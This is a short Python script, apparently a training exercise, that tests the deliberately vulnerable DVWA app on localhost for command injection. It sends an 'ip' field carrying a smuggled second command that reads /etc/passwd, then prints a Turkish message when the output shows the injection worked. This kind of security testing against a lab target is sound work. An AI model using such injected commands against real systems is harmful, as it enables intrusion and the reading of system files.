import requests

header = {"Cookie": "security=low; PHPSESSID=t6fsab21kllkntcbtjf4mvhohp"}
url = "http://127.0.0.1/dvwa/vulnerabilities/exec/"
data = {"ip": "127.0.0.1;cat /etc/passwd", "Submit": "Submit"}
sonuc = requests.post(url=url, data=data, headers=header)

if "www-data" in str(sonuc.content):
    print("Command injection vardır")
